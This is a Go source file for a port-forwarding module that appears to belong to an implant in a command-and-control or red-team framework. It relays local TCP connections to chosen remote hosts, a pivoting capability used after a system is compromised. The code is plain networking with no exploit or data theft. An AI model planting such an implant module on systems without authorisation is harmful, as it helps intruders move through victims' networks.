package portfwd

import (
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/r74tech/virga/internal/implant/logger"
)

// PortfwdModule handles port forwarding
type PortfwdModule struct {
	forwards map[string]*PortForward
	mu       sync.Mutex
}

// PortForward represents an active port forward
type PortForward struct {
	LocalPort  int
	RemoteHost string
	RemotePort int
	listener   net.Listener
	active     bool
	stopChan   chan bool
}

// NewPortfwdModule creates a new port forwarding module
func NewPortfwdModule() *PortfwdModule {
	return &PortfwdModule{
		forwards: make(map[string]*PortForward),
	}
}

// Name returns the module name
func (m *PortfwdModule) Name() string {
	return "portfwd"
}

// Execute handles port forwarding commands
// args[0] = action (add/list/remove)
// For add: args[1] = local_port, args[2] = remote_host, args[3] = remote_port
// For remove: args[1] = local_port
func (m *PortfwdModule) Execute(args []string) (string, int, error) {
	action := "list"
	if len(args) > 0 {
		action = args[0]
	}

	log := logger.Get()

	switch action {
	case "add":
		if len(args) < 4 {
			return "", 1, fmt.Errorf("portfwd add requires local_port remote_host remote_port")
		}

		localPort, err := strconv.Atoi(args[1])
		if err != nil {
			return "", 1, fmt.Errorf("invalid local port: %s", args[1])
		}
		if localPort < 0 || localPort > 65535 {
			return "", 1, fmt.Errorf("invalid port: %d (must be 0-65535, 0 for auto-assign)", localPort)
		}

		remotePort, err := strconv.Atoi(args[3])
		if err != nil {
			return "", 1, fmt.Errorf("invalid remote port: %s", args[3])
		}
		if remotePort < 1 || remotePort > 65535 {
			return "", 1, fmt.Errorf("invalid port: %d (must be 1-65535)", remotePort)
		}

		remoteHost := args[2]

		// Start port forward
		actualPort, err := m.addPortForward(localPort, remoteHost, remotePort)
		if err != nil {
			log.LogCommand(fmt.Sprintf("portfwd add %d %s %d", localPort, remoteHost, remotePort), "", 1, err)
			return fmt.Sprintf("Failed to add port forward: %s", err), 1, err
		}

		result := fmt.Sprintf("Port forward added: localhost:%d -> %s:%d", actualPort, remoteHost, remotePort)
		log.LogCommand(fmt.Sprintf("portfwd add %d %s %d", localPort, remoteHost, remotePort), result, 0, nil)
		return result, 0, nil

	case "list":
		m.mu.Lock()
		defer m.mu.Unlock()

		if len(m.forwards) == 0 {
			return "No active port forwards", 0, nil
		}

		result := "Active port forwards:\n"
		for key, fwd := range m.forwards {
			status := "active"
			if !fwd.active {
				status = "inactive"
			}
			result += fmt.Sprintf("  %s: localhost:%d -> %s:%d (%s)\n",
				key, fwd.LocalPort, fwd.RemoteHost, fwd.RemotePort, status)
		}

		log.LogCommand("portfwd list", result, 0, nil)
		return result, 0, nil

	case "remove":
		if len(args) < 2 {
			errMsg := "portfwd remove requires local_port"
			return errMsg, 1, fmt.Errorf(errMsg)
		}

		localPort, err := strconv.Atoi(args[1])
		if err != nil {
			return "", 1, fmt.Errorf("invalid local port: %s", args[1])
		}

		err = m.removePortForward(localPort)
		if err != nil {
			log.LogCommand(fmt.Sprintf("portfwd remove %d", localPort), "", 1, err)
			return fmt.Sprintf("Failed to remove port forward: %s", err), 1, err
		}

		result := fmt.Sprintf("Port forward removed: localhost:%d", localPort)
		log.LogCommand(fmt.Sprintf("portfwd remove %d", localPort), result, 0, nil)
		return result, 0, nil

	default:
		errMsg := fmt.Sprintf("unknown command: %s (use add/list/remove)", action)
		return errMsg, 1, fmt.Errorf(errMsg)
	}
}

// addPortForward starts a new port forward
func (m *PortfwdModule) addPortForward(localPort int, remoteHost string, remotePort int) (int, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Create listener
	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return 0, fmt.Errorf("failed to listen on port %d: %w", localPort, err)
	}

	// Get actual port (in case port 0 was used for auto-assignment)
	addr := listener.Addr().(*net.TCPAddr)
	actualPort := addr.Port

	key := strconv.Itoa(actualPort)
	if _, exists := m.forwards[key]; exists {
		listener.Close()
		return 0, fmt.Errorf("port forward already exists on port %d", actualPort)
	}

	fwd := &PortForward{
		LocalPort:  actualPort,
		RemoteHost: remoteHost,
		RemotePort: remotePort,
		listener:   listener,
		active:     true,
		stopChan:   make(chan bool),
	}

	m.forwards[key] = fwd

	// Start forwarding in background
	go m.handlePortForward(fwd)

	return actualPort, nil
}

// removePortForward stops a port forward
func (m *PortfwdModule) removePortForward(localPort int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	key := strconv.Itoa(localPort)
	fwd, exists := m.forwards[key]
	if !exists {
		return fmt.Errorf("port forward not found on port %d", localPort)
	}

	// Stop the forward
	fwd.active = false
	close(fwd.stopChan)
	fwd.listener.Close()

	delete(m.forwards, key)
	return nil
}

// handlePortForward handles connections for a port forward
func (m *PortfwdModule) handlePortForward(fwd *PortForward) {
	log := logger.Get()

	for {
		select {
		case <-fwd.stopChan:
			return
		default:
			// Set accept timeout
			fwd.listener.(*net.TCPListener).SetDeadline(time.Now().Add(1 * time.Second))

			conn, err := fwd.listener.Accept()
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				if !fwd.active {
					return
				}
				log.Debug("Port forward accept error", map[string]interface{}{
					"error": err.Error(),
					"port":  fwd.LocalPort,
				})
				continue
			}

			// Handle connection in goroutine
			go m.handleConnection(conn, fwd)
		}
	}
}

// handleConnection forwards a single connection
func (m *PortfwdModule) handleConnection(localConn net.Conn, fwd *PortForward) {
	defer localConn.Close()

	log := logger.Get()

	// Connect to remote
	remoteConn, err := net.DialTimeout("tcp",
		fmt.Sprintf("%s:%d", fwd.RemoteHost, fwd.RemotePort),
		10*time.Second)
	if err != nil {
		log.Debug("Port forward remote connection failed", map[string]interface{}{
			"error":  err.Error(),
			"remote": fmt.Sprintf("%s:%d", fwd.RemoteHost, fwd.RemotePort),
		})
		return
	}
	defer remoteConn.Close()

	// Bidirectional copy
	done := make(chan bool, 2)

	go func() {
		io.Copy(remoteConn, localConn)
		done <- true
	}()

	go func() {
		io.Copy(localConn, remoteConn)
		done <- true
	}()

	// Wait for either direction to finish
	<-done
}
